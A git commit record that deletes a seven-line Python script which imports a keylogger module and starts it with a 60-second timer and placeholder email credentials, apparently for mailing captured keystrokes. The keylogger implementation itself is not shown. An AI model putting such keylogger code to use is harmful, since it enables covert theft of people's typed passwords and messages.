8942124808e6b9d9443bd46b7c8a2304423f725a
Raj Upadhyay <upadhyayraj007@gmail.com>
2020-02-13 11:14:59 +0530

    Delete use_key_log.py

--- use_key_log.py
+++
@@ -1,7 +0,0 @@
-import key_log
-
-my_keylogger = key_log.Keylogger(60,"email@email.com","pwd")
-#First Argument is "TIMER" like 60 Seconds
-#Second Argument is "Email ID"
-#Third Argument is "Password"
-my_keylogger.start() 
